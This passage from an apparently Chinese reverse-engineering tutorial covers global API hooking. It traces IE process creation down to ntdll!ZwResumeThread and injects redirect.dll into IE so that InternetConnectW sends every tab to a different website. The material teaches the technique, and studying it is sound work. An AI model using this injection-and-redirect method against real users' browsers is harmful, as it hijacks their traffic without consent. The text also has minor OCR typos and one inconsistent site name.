hInternet,</span><br><span class="hljs-params">  [in] LPCSTR        lpszServerName,</span><br><span class="hljs-params">  [in] INTERNET_PORT nServerPort,</span><br><span class="hljs-params">  [in] LPCSTR        lpszUserName,</span><br><span class="hljs-params">  [in] LPCSTR        lpszPassword,</span><br><span class="hljs-params">  [in] DWORD         dwService,</span><br><span class="hljs-params">  [in] DWORD         dwFlags,</span><br><span class="hljs-params">  [in] DWORD_PTR     dwContext</span><br><span class="hljs-params">)</span>;<br></code></pre></td></tr></table></figure><p>接下来验证Wininet.InternetConnect() API是否就是要钩取的API。</p><p><strong>验证：调试旧进程</strong></p><p>首先使用OllyDbg附加IE进程，然后在wininet!InternetConnectW() API处设置好断点（InternetConnectW() API是InternetConnect()的宽字符版本），如图34-2所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC34%E7%AB%A0%20%E9%AB%98%E7%BA%A7%E5%85%A8%E5%B1%80API%E9%92%A9%E5%8F%96%EF%BC%9AIE%E8%BF%9E%E6%8E%A5%E6%8E%A7%E5%88%B6.assets/image-20220306134916470.png#crop=0&crop=0&crop=1&crop=1&id=znv0Y&originHeight=239&originWidth=612&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" alt="图34-2 在WININET.InternetConnectW()处设置断点"></p><p>然后在IE地址栏中输入要连接的网站地址，如图34-3所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC34%E7%AB%A0%20%E9%AB%98%E7%BA%A7%E5%85%A8%E5%B1%80API%E9%92%A9%E5%8F%96%EF%BC%9AIE%E8%BF%9E%E6%8E%A5%E6%8E%A7%E5%88%B6.assets/image-20220306134137862.png#crop=0&crop=0&crop=1&crop=1&id=Rn8vb&originHeight=244&originWidth=614&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" alt="图34-3 IE地址栏"></p><p>调试器暂停在设置的断点处，此时查看进程栈，如图34-4所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC34%E7%AB%A0%20%E9%AB%98%E7%BA%A7%E5%85%A8%E5%B1%80API%E9%92%A9%E5%8F%96%EF%BC%9AIE%E8%BF%9E%E6%8E%A5%E6%8E%A7%E5%88%B6.assets/image-20220306134814625.png#crop=0&crop=0&crop=1&crop=1&id=xaAY8&originHeight=176&originWidth=598&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" alt="图34-4 断点位置的栈"></p><p>从栈信息中可以看到，连接地址（IpszServerName ）就是前面在正地址栏中输入的<a href="http://www.baidu.com地址.下面修改连接地址进行测试./">www.baidu.com地址。下面修改连接地址进行测试。</a></p><p>如图34-5所示，将 “<a href="http://www.baidu.com”/">www.baidu.com”</a> 修改为 “<a href="http://www.reversecore.com”/">www.reversecore.com”</a> 字符串。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC34%E7%AB%A0%20%E9%AB%98%E7%BA%A7%E5%85%A8%E5%B1%80API%E9%92%A9%E5%8F%96%EF%BC%9AIE%E8%BF%9E%E6%8E%A5%E6%8E%A7%E5%88%B6.assets/image-20220306135322696.png#crop=0&crop=0&crop=1&crop=1&id=fRrXG&originHeight=305&originWidth=639&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" alt="图34-5 修改连接地址"></p><blockquote><p>上面地址全为Unicode字符串，最后以2个字节的NULL （0000）结束（在HEX 窗口中向字符串末尾输入00 00即可）。</p></blockquote><p>修改连接地址后运行调试器，它会在设置断点的wininet!ImernetConnectW()处反复暂停，这是因为一个网站往往由多个链接地址组成。删除断点后继续运行（仅在第一次调用InternetConnectW()时操作一次栈即可）。最终，IE浏览器会连接到修改后的<a href="http://www.reversecore.com网站,而不是先前的www.google.com网站,如图34-6所示./">www.reversecore.com网站，而不是先前的www.google.com网站，如图34-6所示。</a></p><p>因此，钩取wininet!InternetConnectW()后，修改IpszServerName参数即可控制IE要连接的网站。看来，钩取!InternetConnectW()API是个非常好的选择。原理相当简单，因为IE使用wininet.dll库，所以很容易钩取API。以上这些就是常用的AM钩取方法，但具体实现时有一点需要考虑，IE8具 有独特的进程结构，钩取时要使用全局API钩取技术。</p><h1 id="34-2-旧进程结构"><a href="#34-2-旧进程结构" class="headerlink" title="34.2 旧进程结构"></a>34.2 旧进程结构</h1><p>重新运行IE浏览器，打开多个选项卡（tab ），分别连接到不同网站，如图34-7所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC34%E7%AB%A0%20%E9%AB%98%E7%BA%A7%E5%85%A8%E5%B1%80API%E9%92%A9%E5%8F%96%EF%BC%9AIE%E8%BF%9E%E6%8E%A5%E6%8E%A7%E5%88%B6.assets/image-20220306151932859.png#crop=0&crop=0&crop=1&crop=1&id=iqOs4&originHeight=176&originWidth=471&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" alt="图34-7 IE选项卡"></p><p>使用Process Explorer查看IE进程结构，如图34-8所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC34%E7%AB%A0%20%E9%AB%98%E7%BA%A7%E5%85%A8%E5%B1%80API%E9%92%A9%E5%8F%96%EF%BC%9AIE%E8%BF%9E%E6%8E%A5%E6%8E%A7%E5%88%B6.assets/image-20220306151941592.png#crop=0&crop=0&crop=1&crop=1&id=M6vUZ&originHeight=296&originWidth=827&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" alt="图34-8 iexplorer.exe进程结构"></p><p>从图34-7与图34-8中可以看到，IE中有2个选项卡，共有3个IE进程（iexplore.exe ）在运行。并且PID为4184的iexplore.exe进程与其他iexplore.exe进程形成了父子关系。从IE进程结构来看，IE应用程序为父进程（PID: 3784），它管理着各选项卡对应的子进程。</p><blockquote><p>IE 7开始引入“选项卡”这一概念，进程结构也发生了如上所示的变化。这种新进程结构下，每个选项卡都是一个独立运行的进程，其中一个选项卡发生错误，不会影响到其他选项卡或父进程（IE本身）（最新的网页浏览器中都使用了这项技术）。</p></blockquote><p>像这样，IE应用程序中每个选项卡对应的子iexplore.exe进程实际负载网络连接，创建选项卡进程时，（相关进程的）API就会被执行钩取操作，即采用全局API钩取技术钩取。否则，在新选项卡中连接网站时将无法钩取。前面我们介绍了通过钩取kernel32!CreateProcess() API实现全局API钩取的方法，并且说明了使用CreateProcess() API钩取这一方法的限制条件。</p><p>本章将介绍一种更安全、更方便的全局API钩取方法，采用该方法可有效消除因使用CreateProcess() API钩取技术实现全局API钩取而产生的不便。这种新方法是，钩取ntdll!ZwResumeThread()API,创建进程之后，主线程被Resume （恢复运行）时，可以钩取目标API。</p><h1 id="34-3关于全局API钩取的概念"><a href="#34-3关于全局API钩取的概念" class="headerlink" title="34.3关于全局API钩取的概念"></a>34.3关于全局API钩取的概念</h1><p>下面对全局API钩取进行简单整理。通过前面的学习，我们已经能对特定进程的指定API进<br>行简单的钩取操作。</p><h2 id="34-3-1-常规API钩取"><a href="#34-3-1-常规API钩取" class="headerlink" title="34.3.1 常规API钩取"></a>34.3.1 常规API钩取</h2><p>使用常规API钩取方法时，每当（要钩取的）目标进程被创建时，都要钩取指定API。图34-9描述了通过DLL注入技术实施常规API钩取操作的情形。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC34%E7%AB%A0%20%E9%AB%98%E7%BA%A7%E5%85%A8%E5%B1%80API%E9%92%A9%E5%8F%96%EF%BC%9AIE%E8%BF%9E%E6%8E%A5%E6%8E%A7%E5%88%B6.assets/image-20220306152450079.png#crop=0&crop=0&crop=1&crop=1&id=yOFT9&originHeight=260&originWidth=435&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" alt="图34-9 常规API钩取"></p><p>图34-9中要钩取的目标进程为Test.exe（PID: 2492 ）。使用InjDll.exe程序将Hook.dll注入Test.exe进程，然后钩取指定API①。若后面生成了另外一个Test.exe进程（PID: 3796），则必须先向它注入Hook.dll才能（对PID为3796的进程）实现正常的API钩取操作②。也就是说，每当要钩取的目标进程生成时都要手动钩取API。</p><h2 id="34-3-2全局API钩取"><a href="#34-3-2全局API钩取" class="headerlink" title="34.3.2全局API钩取"></a>34.3.2全局API钩取</h2><p>接下来看一下全局API钩取的操作过程，如图34-10所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC34%E7%AB%A0%20%E9%AB%98%E7%BA%A7%E5%85%A8%E5%B1%80API%E9%92%A9%E5%8F%96%EF%BC%9AIE%E8%BF%9E%E6%8E%A5%E6%8E%A7%E5%88%B6.assets/image-20220306152615391.png#crop=0&crop=0&crop=1&crop=1&id=G3npD&originHeight=292&originWidth=399&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" alt="图34-10 全局API钩取"></p><p>InjDll.exe负责将gHook.dll注入Explorer.exe进程（Windows操作系统的基本Shell ）。请注意，我们要钩取的进程不是Test.exe，而是启动运行Test.exe的Explorer.exe进程，这是最核心的部分。gHook.dll扩展了图34-9中Hook.dll的功能，它钩取创建子进程的API，每当子进程被创建时，它都会将自身（gHook.dll）注入新创建的进程（参考图34-10 ）。所以向Explorer.exe进程（Windows Shell）注入1次gHook.dll后，随后Explorer.exe创建的所有子进程都会自动注入gHook.dll。这就是自动API钩取的基本概念，将这一概念扩展应用到系统中运行的所有进程，就形成了全局API钩取。</p><blockquote><p>除Explorer.exe之外，其他进程也可以创建子进程。所以要完美实现全局API钩取，必须钩取当前运行的所有进程。但是基于系统稳定性与减少不必要系统开销的考虑，常常（根据实际要求）仅钩取特定进程（示例中对IE的钩取就是典型例子）。</p></blockquote><p>到此我们已经梳理了全局API钩取的概念。下面分析钩取哪些API才能使全局API钩取实现起来更容易。</p><h1 id="34-4-ntdll-ZwResumeThread-API"><a href="#34-4-ntdll-ZwResumeThread-API" class="headerlink" title="34.4 ntdll!ZwResumeThread() API"></a>34.4 ntdll!ZwResumeThread() API</h1><p>首先，想想创建子进程的API有哪些，创建进程的API中最具代表性的绝对是kernel32!CreateProcess() API。下面编写一个简单的程序来测试CreateProcess() API,代码如下所示。</p><blockquote><p>所有源代码均使用MS Visual C++Express Edition 2010工具编写而成，在Windows 7 32位&amp; IE 8中通过测试。</p></blockquote><p>编译代码34-1，生成cptest.exe可执行文件。调试这个文件可以把握与进程创建相关的API调用流程。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// cptest.cpp</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;windows.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;tchar.h&quot;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>STARTUPINFO si = &#123;<span class="hljs-number">0</span>,&#125;;<br>PROCESS_INFORMATION pi = &#123;<span class="hljs-number">0</span>,&#125;;<br>TCHAR szCmd[MAX_PATH] = &#123;<span class="hljs-number">0</span>,&#125;;<br><br>si.cb = <span class="hljs-keyword">sizeof</span>(STARTUPINFO);<br>_tcscpy(szCmd, <span class="hljs-string">L&quot;notepad.exe&quot;</span>);<br><span class="hljs-keyword">if</span>(!CreateProcess(<span class="hljs-literal">NULL</span>, <span class="hljs-comment">// lpApplicationName</span><br>szCmd, <span class="hljs-comment">// lpCommandLine</span><br><span class="hljs-literal">NULL</span>, <span class="hljs-comment">// lpProcessAttributes</span><br><span class="hljs-literal">NULL</span>, <span class="hljs-comment">// lpThreadAttributes</span><br>FALSE, <span class="hljs-comment">// blnheritHandles</span><br>NORMAL_PRIORITY_CLASS,<span class="hljs-comment">// dwCreationFlags</span><br><span class="hljs-literal">NULL</span>, <span class="hljs-comment">// lpEnvironment</span><br><span class="hljs-literal">NULL</span>, <span class="hljs-comment">// lpCurrentDirectory</span><br>&amp;si, <span class="hljs-comment">// lpStartupInfo</span><br>&amp;pi)) <span class="hljs-comment">// lpProcessInformation</span><br><span class="hljs-keyword">return</span>;<br><span class="hljs-keyword">if</span>(pi.hProcess != <span class="hljs-literal">NULL</span>)<br>CloseHandle(pi.hProcess);<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>CreateProcessW是CreateProcess 的宽字符（UNICODE）版本。</p></blockquote><p>图34-11是调用cptest.exe的kernel32!CreateProcessW()的代码。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC34%E7%AB%A0%20%E9%AB%98%E7%BA%A7%E5%85%A8%E5%B1%80API%E9%92%A9%E5%8F%96%EF%BC%9AIE%E8%BF%9E%E6%8E%A5%E6%8E%A7%E5%88%B6.assets/image-20220311164242886.png#crop=0&crop=0&crop=1&crop=1&id=x4WeT&originHeight=644&originWidth=1618&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" alt="图34-11 调用CreateProcessW()的代码"></p><p>跟踪进入kernel32!CreateProcessW（StepInto（F7）），可以看到在其内部又调用了kernel32!CreateProcessInternelW()，如图34-12所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC34%E7%AB%A0%20%E9%AB%98%E7%BA%A7%E5%85%A8%E5%B1%80API%E9%92%A9%E5%8F%96%EF%BC%9AIE%E8%BF%9E%E6%8E%A5%E6%8E%A7%E5%88%B6.assets/image-20220311164522336.png#crop=0&crop=0&crop=1&crop=1&id=MTCxc&originHeight=648&originWidth=1613&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" alt="图34-12 调用CreateProcessInternalW()"></p><p>在图34-12中查看下方栈内存，可以看到它与图34-11中的栈（函数参数）几乎是一样的。继续跟踪进入kernel32!CreateProcessInternelW()，如图34-13所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC34%E7%AB%A0%20%E9%AB%98%E7%BA%A7%E5%85%A8%E5%B1%80API%E9%92%A9%E5%8F%96%EF%BC%9AIE%E8%BF%9E%E6%8E%A5%E6%8E%A7%E5%88%B6.assets/image-20220311164616808.png#crop=0&crop=0&crop=1&crop=1&id=Wyp7x&originHeight=339&originWidth=993&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" alt="图34-13 CreateProcessInternalW()代码"></p><p>kernel32!CreateProcessInternelW()是一个相当大的函数。在代码窗口中向下拖动滑动条，就会岀现调用ntdll!ZwCreateUserProcess()的代码，如图34-14所示。</p><blockquote><p>这里没找到Zw，找的是Nt</p></blockquote><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC34%E7%AB%A0%20%E9%AB%98%E7%BA%A7%E5%85%A8%E5%B1%80API%E9%92%A9%E5%8F%96%EF%BC%9AIE%E8%BF%9E%E6%8E%A5%E6%8E%A7%E5%88%B6.assets/image-20220311165815048.png#crop=0&crop=0&crop=1&crop=1&id=KkNop&originHeight=648&originWidth=1613&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" alt="图34-14调用ZwCreateUserProcess()的代码"></p><p>在图34-14中查看下方的栈，可以看到它与图34-12中的栈有着非常大的不同。第二个参数（Arg2）是一个结构体，查看左侧的Hex dump窗口可以发现，结构体成员中，地址12F954存储的12FD3C是字符串（“notepad”）的地址（参考图34-11 中的栈）。调用Ntdll!ZwCreateUserProcess()时子进程就会被挂起（Suspend ），暂停运行，如图34-15所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC34%E7%AB%A0%20%E9%AB%98%E7%BA%A7%E5%85%A8%E5%B1%80API%E9%92%A9%E5%8F%96%EF%BC%9AIE%E8%BF%9E%E6%8E%A5%E6%8E%A7%E5%88%B6.assets/image-20220311172112770.png#crop=0&crop=0&crop=1&crop=1&id=dgwzS&originHeight=181&originWidth=415&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" alt="图34-15 notepad.exe被挂起"></p><p>notepad.exe进程已经生成，但是其EP代码尚未运行。在图34-14代码中继续执行，就会出现调用ntdll!ZwResumeThread() API 的代码，如图34-16所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC34%E7%AB%A0%20%E9%AB%98%E7%BA%A7%E5%85%A8%E5%B1%80API%E9%92%A9%E5%8F%96%EF%BC%9AIE%E8%BF%9E%E6%8E%A5%E6%8E%A7%E5%88%B6.assets/image-20220311170955650.png#crop=0&crop=0&crop=1&crop=1&id=bMxUd&originHeight=296&originWidth=816&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" alt="图34-16 调用ZwResumeThread()函数的代码"></p><p>顾名思义，ntdlllZwResumeThread()函数就是用来恢复运行线程的。该线程即是子进程（notepad.exe）的主线程。所以调用执行该API时，子进程的EP代码才会执行，如图34-17所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC34%E7%AB%A0%20%E9%AB%98%E7%BA%A7%E5%85%A8%E5%B1%80API%E9%92%A9%E5%8F%96%EF%BC%9AIE%E8%BF%9E%E6%8E%A5%E6%8E%A7%E5%88%B6.assets/image-20220311172145251.png#crop=0&crop=0&crop=1&crop=1&id=Z7GyA&originHeight=181&originWidth=415&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" alt="图34-17 恢复运行的notepad.exe"></p><p>综上所述，CreateProcessW() API的调用流程整理如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">kernel32!CreateProcessW<br>kernel32!CreateProcessInternalW<br>ntdll!ZwCreateUserProcess <span class="hljs-comment">//创建进程（主线程处于挂起状态）</span><br>ntdll!ZwResumeThread <span class="hljs-comment">//主线程被恢复运行（运行进程）</span><br></code></pre></td></tr></table></figure><p>创建子进程的过程中最后被调用的API是ntdll!ZwResumeThread()。所以钩取该API，在子进程的EP代码运行之前，拦截获取控制权，然后钩取指定API。ntdll!ZwResumeThread()是尚未公开的API,函数定义（出处：MSDN）如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">NTSTATUS <span class="hljs-title function_">NtResumeThread</span><span class="hljs-params">(</span><br><span class="hljs-params">INHANDLEThreadHandle,</span><br><span class="hljs-params">OUTPULONGSuspendCount OPTIONAL</span><br><span class="hljs-params">)</span>;<br></code></pre></td></tr></table></figure><blockquote><p>用户模式中 ntdll!ZwResumeThread() API 与 ntdll!NtResumeThread() API 虽然名称不同，但其实是同一函数。</p></blockquote><p>前面介绍的4个API（CreateProcessW、CreateProcessInternalW、ZwCreateUserProcess、ZwResumeThread）中，无论钩取哪个API,都能实现我们的目标—全局API钩取（下面练习中将钩取ntdll.ZwResumeThread() API ）。</p><p>若钩取位于上层的CreateProcessW()函数，则在某个特定情形下（如直接调用CreateProcessInternelW时）可能导致无法正常钩取。所以最好钩取CreateProcessInternelW()下层的函数（各有优缺点，建议各位都尝试一下）。</p><h1 id="34-5练习示例：控制旧网络连接"><a href="#34-5练习示例：控制旧网络连接" class="headerlink" title="34.5练习示例：控制旧网络连接"></a>34.5练习示例：控制旧网络连接</h1><p>下面做个练习，目标是控制IE的网络连接。钩取IE进程的特定API,用IE连接指定网站时，使之连接到另外一个网站（<a href="http://www.reversecore.com).此外,在ie中添加新选项卡,同时比较新添加的进程的情形,进一步了解全局api钩取技术./">www.reversecore.com）。此外，在IE中添加新选项卡，同时比较新添加的进程的情形，进一步了解全局API钩取技术。</a></p><blockquote><p>本练习示例在Windows XP SP3、Windows 7 32位操作系统及IE 8中通过测试。</p></blockquote><p>示例练习中，我们将向目标进程注入redirect.dll来实现API钩取。redirect.dll钩取下面2个API。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">wininet!InternetConnectW():钩取后可以控制IE进程的连接地址。<br>ntdll!ZwResumeThread():钩取后实现全局API钩取。<br></code></pre></td></tr></table></figure><h2 id="34-5-1-运行IE"><a href="#34-5-1-运行IE" class="headerlink" title="34.5.1 运行IE"></a>34.5.1 运行IE</h2><p>首先运行IE浏览器，然后使用Process Explorer查看运行中的IE进程的结构。</p><p>从图34-18中可以看到，IE进程以父子进程的形式运行。只要钩取父进程ntdinZwResumeThread()API,那么后面生成的所有子IE进程都会自动钩取。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC34%E7%AB%A0%20%E9%AB%98%E7%BA%A7%E5%85%A8%E5%B1%80API%E9%92%A9%E5%8F%96%EF%BC%9AIE%E8%BF%9E%E6%8E%A5%E6%8E%A7%E5%88%B6.assets/image-20220311193809136.png#crop=0&crop=0&crop=1&crop=1&id=rUt8j&originHeight=368&originWidth=877&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" alt="图34-18 iexplore.exe进程"></p><h2 id="34-5-2-注入-DLL"><a href="#34-5-2-注入-DLL" class="headerlink" title="34.5.2 注入 DLL"></a>34.5.2 注入 DLL</h2><p>首先在命令行窗口中使用InjDll.exe命令，将redirect.dll文件注入IE进程（iexplore.exe）,如图34-19所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC34%E7%AB%A0%20%E9%AB%98%E7%BA%A7%E5%85%A8%E5%B1%80API%E9%92%A9%E5%8F%96%EF%BC%9AIE%E8%BF%9E%E6%8E%A5%E6%8E%A7%E5%88%B6.assets/image-20220311194649026.png#crop=0&crop=0&crop=1&crop=1&id=eBRjV&originHeight=197&originWidth=855&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" alt="图34-19 运行InjDll.exe-将redirect.dir注入iexplore.exe"></p><p>使用Process Explorer工具查看redirect.dll文件是否正常注入IE进程，如图34-20所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC34%E7%AB%A0%20%E9%AB%98%E7%BA%A7%E5%85%A8%E5%B1%80API%E9%92%A9%E5%8F%96%EF%BC%9AIE%E8%BF%9E%E6%8E%A5%E6%8E%A7%E5%88%B6.assets/image-20220311194924843.png#crop=0&crop=0&crop=1&crop=1&id=jspU8&originHeight=220&originWidth=599&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" alt="图34-20 査看redirect.dll成功注入"></p><p>InjDll.exe是专门用于注入的程序。更多相关说明请参考第44章“DLL注入专用工具”。</p><h2 id="34-5-3-创建新选项卡"><a href="#34-5-3-创建新选项卡" class="headerlink" title="34.5.3 创建新选项卡"></a>34.5.3 创建新选项卡</h2><p>在IE浏览器中创建新选项卡，如图34-21所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC34%E7%AB%A0%20%E9%AB%98%E7%BA%A7%E5%85%A8%E5%B1%80API%E9%92%A9%E5%8F%96%EF%BC%9AIE%E8%BF%9E%E6%8E%A5%E6%8E%A7%E5%88%B6.assets/image-20220311195230157.png#crop=0&crop=0&crop=1&crop=1&id=a3hMo&originHeight=336&originWidth=836&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" alt="图34-21 新建IE选项卡"></p><p>使用Process Explorer工具可以看到，redirect.dll已经成功注入新选项卡进程（PID：3472），如图34-22所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC34%E7%AB%A0%20%E9%AB%98%E7%BA%A7%E5%85%A8%E5%B1%80API%E9%92%A9%E5%8F%96%EF%BC%9AIE%E8%BF%9E%E6%8E%A5%E6%8E%A7%E5%88%B6.assets/image-20220311195432818.png#crop=0&crop=0&crop=1&crop=1&id=bt8oo&originHeight=611&originWidth=809&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" alt="图34-22 向新IE进程注入redirect.dll"></p><p>由此可见，通过钩取ntdll!ZwResumeThread()API成功实现了全局API钩取。</p><h2 id="34-5-4尝试连接网站"><a href="#34-5-4尝试连接网站" class="headerlink" title="34.5.4尝试连接网站"></a>34.5.4尝试连接网站</h2><p>在IE任意一个选项卡中尝试连接下列网站。<br><a href="http://www.naver.com/">www.naver.com</a><br><a href="http://www.daum.net/">www.daum.net</a><br><a href="http://www.nate.com/">www.nate.com</a><br><a href="http://www.yahoo.com/">www.yahoo.com</a></p><p>如图34-23所示，虽然地址栏中输入的是yahoo，但是浏览器实际跳转到了网站ReverseCore。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC34%E7%AB%A0%20%E9%AB%98%E7%BA%A7%E5%85%A8%E5%B1%80API%E9%92%A9%E5%8F%96%EF%BC%9AIE%E8%BF%9E%E6%8E%A5%E6%8E%A7%E5%88%B6.assets/image-20220311200144905.png#crop=0&crop=0&crop=1&crop=1&id=clyn2&originHeight=245&originWidth=596&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" alt="图34-23 被钩取的IE进程"></p><h2 id="34-5-5-卸载-DLL"><a href="#34-5-5-卸载-DLL" class="headerlink" title="34.5.5 卸载 DLL"></a>34.5.5 卸载 DLL</h2><p>下面从IE进程卸载（Unloading） redirect.dll文件，如图34-24所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC34%E7%AB%A0%20%E9%AB%98%E7%BA%A7%E5%85%A8%E5%B1%80API%E9%92%A9%E5%8F%96%EF%BC%9AIE%E8%BF%9E%E6%8E%A5%E6%8E%A7%E5%88%B6.assets/image-20220311200256854.png#crop=0&crop=0&crop=1&crop=1&id=AN4ky&originHeight=108&originWidth=518&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" alt="图34-24 从iexplore.exe进程卸载redirect.dll"></p><p>使用Process Explorer工具可以看到redirect.dll已成功卸载（参考图34-25 ）。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC34%E7%AB%A0%20%E9%AB%98%E7%BA%A7%E5%85%A8%E5%B1%80API%E9%92%A9%E5%8F%96%EF%BC%9AIE%E8%BF%9E%E6%8E%A5%E6%8E%A7%E5%88%B6.assets/image-20220311200320778.png#crop=0&crop=0&crop=1&crop=1&id=Vi3v3&originHeight=199&originWidth=600&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" alt="图34-25 redirect.dll成功卸载"></p><p>现在使用IE浏览器重新连接Naver，可以看到IE正常连接，如图34-26所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC34%E7%AB%A0%20%E9%AB%98%E7%BA%A7%E5%85%A8%E5%B1%80API%E9%92%A9%E5%8F%96%EF%BC%9AIE%E8%BF%9E%E6%8E%A5%E6%8E%A7%E5%88%B6.assets/image-20220311200348791.png#crop=0&crop=0&crop=1&crop=1&id=mb03D&originHeight=608&originWidth=1016&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" alt="图34-26 “脱钩”后的IE浏览器"></p><h2 id="34-5-6-课外练习"><a href="#34-5-6-课外练习" class="headerlink" title="34.5.6 课外练习"></a>34.5.6 课外练习</h2><p>请各位使用前面介绍的InjDll.exe与redirect.dll文件再多做些课外练习。练习做得多了，才能 真正理解全局API钩取技术的原理与含义。</p><ul><li><p>钩取所有进程。</p></li><li><p>仅钩取explorer.exe （以后运行IE ）。</p></li></ul><h1 id="34-6-示例源代码"><a href="#34-6-示例源代码" class="headerlink" title="34.6 示例源代码"></a>34.6 示例源代码</h1><p>本节讲解主要函数（为讲解方便，代码中省略了异常处理部分）。</p><h2 id="34-6-1-DIIMain"><a href="#34-6-1-DIIMain" class="headerlink" title="34.6.1 DIIMain()"></a>34.6.1 DIIMain()</h2><p>首先看看DllMain()函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span 